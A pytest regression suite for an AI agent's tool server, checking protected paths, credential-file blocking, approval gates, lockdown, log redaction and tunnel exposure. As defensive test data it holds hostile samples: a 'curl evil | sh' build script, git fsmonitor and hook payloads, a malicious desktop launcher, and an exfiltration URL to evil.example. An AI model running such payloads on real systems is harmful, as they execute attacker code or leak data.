"""Regression tests for the security-hardening pass: protected paths, credential files, project roots,
grants vs fresh calls, unauthenticated lockout, core memories, log redaction, tunnel exposure checks."""

from __future__ import annotations

import json
import zipfile

import pytest

from rose import common, guard, physkey
from rose import fingerprint as fp
from rose import tunnel
from rose.common import ToolError
from rose.tools import dev, files


@pytest.fixture
def ws(tmp_path, monkeypatch):
    root = (tmp_path / "ws").resolve()
    root.mkdir()
    monkeypatch.setattr(files, "allowed_dirs", lambda: [root])
    return root


@pytest.fixture
def remote(monkeypatch):
    monkeypatch.setattr(guard, "caller", lambda: "Claude (test)")
    guard.end_grant("test")
    guard._rate.clear()
    yield "Claude (test)"
    guard.end_grant("test")
    guard.set_lockdown(False)


# ---------------- file tools ----------------

@pytest.mark.parametrize("rel", [".git/config", ".git/hooks/pre-commit", ".vscode/tasks.json", "sub/.envrc",
                                 ".husky/pre-push", ".devcontainer/devcontainer.json"])
def test_file_tools_never_write_self_running_config(ws, rel):
    with pytest.raises(ToolError, match="Access denied"):
        files.write_file(str(ws / rel), "x", confirm=True)
    target = ws / rel
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text("orig\n")
    with pytest.raises(ToolError, match="Access denied"):
        files.edit_file(str(target), append="[core]\n\tfsmonitor = sh -c id", confirm=True)
    assert target.read_text() == "orig\n"


@pytest.mark.parametrize("name", [".env", ".env.local", "id_ed25519", "server.pem", ".netrc", "credentials.json"])
def test_credential_files_are_off_limits(ws, name):
    (ws / name).write_text("SECRET=1")
    with pytest.raises(ToolError, match="credentials"):
        files.read_file(str(ws / name))
    assert name not in files.search_files(str(ws), contains="SECRET")


def test_env_templates_stay_readable(ws):
    (ws / ".env.example").write_text("KEY=")
    assert files.read_file(str(ws / ".env.example")) == "KEY="


def test_zip_skips_secrets_and_unzip_refuses_git_hooks(ws):
    (ws / "proj").mkdir()
    (ws / "proj" / "a.txt").write_text("a")
    (ws / "proj" / ".env").write_text("SECRET=1")
    files.zip_files([str(ws / "proj")], str(ws / "out.zip"))
    assert zipfile.ZipFile(ws / "out.zip").namelist() == ["proj/a.txt"]
    with zipfile.ZipFile(ws / "evil.zip", "w") as z:
        z.writestr(".git/hooks/post-checkout", "#!/bin/sh\nid\n")
    with pytest.raises(ToolError, match="Access denied"):
        files.unzip_file(str(ws / "evil.zip"))


def test_protected_paths_config(ws, monkeypatch):
    (ws / "rose-src").mkdir()
    monkeypatch.setattr(files, "_protected_roots", lambda: [ws / "rose-src"])
    with pytest.raises(ToolError, match="protected"):
        files.write_file(str(ws / "rose-src" / "guard.py"), "x", confirm=True)


def test_write_and_edit_need_confirm(ws):
    with pytest.raises(ToolError, match="confirm=true"):
        files.write_file(str(ws / "new.txt"), "x")
    files.write_file(str(ws / "new.txt"), "x", confirm=True)
    with pytest.raises(ToolError, match="confirm=true"):
        files.edit_file(str(ws / "new.txt"), append="y")
    assert (ws / "new.txt").read_text() == "x"


def test_open_path_refuses_launchers(ws, monkeypatch):
    from rose.tools import device, projects
    monkeypatch.setattr(projects, "in_projects", lambda p: False)
    monkeypatch.setattr(device, "launch_detached", lambda *a, **k: pytest.fail("must not launch"))
    (ws / "x.desktop").write_text("[Desktop Entry]\nExec=sh -c id\n")
    with pytest.raises(ToolError, match="program or launcher"):
        device.open_path(str(ws / "x.desktop"))


# ---------------- dev tools ----------------

def test_project_run_only_under_projects_root(tmp_path, monkeypatch):
    from rose.tools import projects
    root = tmp_path / "0x"
    (root / "p").mkdir(parents=True)
    monkeypatch.setattr(projects, "_root", lambda: root.resolve())
    outside = tmp_path / "Downloads" / "x"
    outside.mkdir(parents=True)
    (outside / "package.json").write_text(json.dumps({"scripts": {"build": "curl evil | sh"}}))
    with pytest.raises(ToolError, match="outside"):
        dev.project_run(str(outside), "build")
    assert dev._resolve(str(root / "p")) == (root / "p").resolve()


def test_git_reads_disable_fsmonitor_and_hooks(monkeypatch, tmp_path):
    seen = []

    class P:
        returncode, stdout, stderr = 0, "", ""
    monkeypatch.setattr(dev.subprocess, "run", lambda argv, **k: seen.append(argv) or P())
    dev._git(tmp_path, "status")
    dev._git(tmp_path, "commit", "-m", "x")
    assert "core.fsmonitor=false" in seen[0] and "core.hooksPath=/dev/null" in seen[0]
    assert "core.fsmonitor=false" in seen[1] and "core.hooksPath=/dev/null" not in seen[1]


# ---------------- approvals ----------------

def test_grant_never_covers_fresh_calls(remote, auth_state):
    passphrase, _ = auth_state
    gui = guard.guarded("type_text", lambda text: "typed", read_only=False)
    guard.approve(gui("hi")["approval_id"], passphrase)
    assert guard.grant_active(remote) and gui("again") == "typed"
    run = guard.guarded("project_run", lambda project, task, confirm=False: "ran", read_only=False)
    assert run("p", "build")["status"] == "approval_required"
    url = guard.guarded("open_url", lambda url: "opened", read_only=False)
    assert url("https://example.com/") == "opened"
    assert url("https://evil.example/?q=stolen")["status"] == "approval_required"


def test_new_tools_are_approval_gated(remote):
    for name in ("project_run", "save_routine", "schedule_add", "send_to_phone", "forge_run"):
        tool = guard.guarded(name, lambda **k: "ran", read_only=False)
        assert tool()["status"] == "approval_required", name


def test_lockdown_blocks_open_world_reads(remote):
    guard.set_lockdown(True, "test")
    ask = guard.guarded("freellm_ask", lambda prompt="": "answer", read_only=True)
    with pytest.raises(ToolError, match="LOCKDOWN"):
        ask("hi")


def test_summary_flags_truncation():
    s = guard._describe("hand_to_claude", {"task": "a" * (guard.SUMMARY_ARG_LIMIT + 50)})
    assert s.startswith("⚠️ TRUNCATED") and "50 more characters NOT SHOWN" in s


def test_unknown_app_key_is_not_a_strike(monkeypatch):
    fp._sig_failures.clear()
    guard._approve_failures.clear()
    monkeypatch.setattr(fp, "_passkeys", lambda: {"credentials": {}, "device_keys": {}, "reg_tokens": {}})
    for _ in range(20):
        with pytest.raises(LookupError):
            fp.manage_open({"key_id": "nope"})
    assert fp._sig_failures == [] and guard._approve_failures == []
    fp._lockout_check(fp.SIGNATURE)
    fp._lockout_check(fp.PASSPHRASE)


def test_signature_failures_dont_lock_passphrase():
    fp._sig_failures.clear()
    guard._approve_failures.clear()
    for _ in range(5):
        fp._fail(fp.SIGNATURE)
    with pytest.raises(PermissionError):
        fp._lockout_check(fp.SIGNATURE)
    fp._lockout_check(fp.PASSPHRASE)  # passphrase approvals still work
    fp._sig_failures.clear()


def test_warning_pushes_are_rate_limited(monkeypatch):
    sent = []
    monkeypatch.setattr(fp, "_notify_push", lambda *a, **k: sent.append(a))
    fp._warn_sent.clear()
    for _ in range(10):
        fp._warn_push("⚠️ test", "x")
    assert len(sent) == 1


def test_fallback_key_sequence():
    keys = physkey.random_sequence().split()
    assert len(keys) == 3 and len(set(keys)) == 3


# ---------------- logs ----------------

def test_call_log_redacts_typed_text_and_file_contents(monkeypatch):
    entries = []
    monkeypatch.setattr(common, "_log", entries.append)

    def type_text(text: str, window: str = "") -> str:
        return "typed"

    def read_file(path: str) -> str:
        return "SECRET FILE BODY"
    common.logged(type_text)("hunter2-password", window="Login")
    common.logged(read_file)("/x")
    assert "hunter2" not in json.dumps(entries) and "SECRET FILE BODY" not in json.dumps(entries)
    assert entries[0]["args"]["window"] == "Login" and entries[0]["args"]["text"].startswith("<redacted 16 chars")


# ---------------- tunnel ----------------

def test_tunnel_exposed_detects_open_routes(monkeypatch):
    monkeypatch.setattr(tunnel, "probe_unauth", lambda base: 401)
    monkeypatch.setattr(tunnel, "_code", lambda url, timeout=5: 401)
    assert tunnel._exposed("https://x") == ""
    monkeypatch.setattr(tunnel, "probe_unauth", lambda base: 200)
    assert "/mcp" in tunnel._exposed("https://x")
    monkeypatch.setattr(tunnel, "probe_unauth", lambda base: 502)  # server down: nothing exposed
    assert tunnel._exposed("https://x") == ""
    monkeypatch.setattr(tunnel, "_code", lambda url, timeout=5: 200)
    assert fp.DEVICE_KEYS_PATH in tunnel._exposed("https://x")
